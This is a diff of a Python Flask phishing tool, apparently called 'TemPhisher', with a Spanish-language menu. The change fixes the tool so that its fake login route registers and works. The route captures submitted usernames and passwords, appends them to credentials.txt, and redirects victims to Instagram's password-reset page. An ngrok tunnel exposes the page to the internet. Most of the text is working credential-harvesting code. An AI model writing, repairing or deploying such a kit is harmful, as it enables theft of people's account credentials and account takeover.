@@ -6,17 +6,17 @@ app = Flask(__name__)
 
 def logo():
     return """
-    _____             ______ _     _     _               
-   |_   _|            | ___ \ |   (_)   | |              
-     | | ___ _ __ ___ | |_/ / |__  _ ___| |__   ___ _ __ 
-     | |/ _ \ '_ ` _ \|  __/| '_ \| / __| '_ \ / _ \ '__|
-     | |  __/ | | | | | |   | | | | \__ \ | | |  __/ |   
-     \_/\___|_| |_| |_\_|   |_| |_|_|___/_| |_|\___|_|   
+     _____             ______ _     _     _               
+    |_   _|            | ___ \ |   (_)   | |              
+      | | ___ _ __ ___ | |_/ / |__  _ ___| |__   ___ _ __ 
+      | |/ _ \ '_ ` _ \|  __/| '_ \| / __| '_ \ / _ \ '__|
+      | |  __/ | | | | | |   | | | | \__ \ | | |  __/ |   
+      \_/\___|_| |_| |_\_|   |_| |_|_|___/_| |_|\___|_|   
 
-           """
+    """
 
 def display_menu():
-    logo()
+    print(logo())
     print("Bienvenido al programa.")
     print("1. Seleccionar template")
     print("2. Seleccionar puerto")
@@ -33,7 +33,7 @@ def get_template_choice():
 
 def get_port_choice():
     port = input("Ingresa el puerto para ejecutar la aplicación (por defecto 5000): ")
-    return port
+    return port if port else 5000
 
 def get_tunnel_choice():
     print("Selecciona el servicio de túnel:")
@@ -50,30 +50,28 @@ def load_config(template_choice):
     else:
         raise ValueError("Opción de template no válida.")
 
-def create_app():
-    @app.route('/', methods=['GET', 'POST'])
-    def index():
-        if request.method == 'POST':
-            username = request.form['username']
-            password = request.form['password']
-            
-            # Store credentials in a local file
-            with open('credentials.txt', 'a') as f:
-                f.write(f"Username: {username}, Password: {password}\n")
-            
-            # Redirect to Instagram page
-            return redirect('https://www.instagram.com/accounts/password/reset/')
-        
-        return render_template(app.config['TEMPLATE'])
-
 def start_tunnel(tunnel_choice, port):
     tunnel_key = str(tunnel_choice)
     if tunnel_key == '1':
         ngrok_tunnel = ngrok.connect(port)
         print(f'Tunnel started at {ngrok_tunnel.public_url}')
-    # add other tunnel options here
     else:
         raise ValueError("Opción de servicio de túnel no válida.")
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        
+        # Store credentials in a local file
+        with open('credentials.txt', 'a') as f:
+            f.write(f"Username: {username}, Password: {password}\n")
+        
+        # Redirect to Instagram page
+        return redirect('https://www.instagram.com/accounts/password/reset/')
+    
+    return render_template(app.config['TEMPLATE'])
 
 def main():
     template_choice = None
@@ -94,7 +92,6 @@ def main():
             if template_choice and port and tunnel_choice:
                 try:
                     load_config(template_choice)
-                    create_app()
                     start_tunnel(tunnel_choice, port)
 
                     print(f'Servidor Flask corriendo en el puerto {port}.')
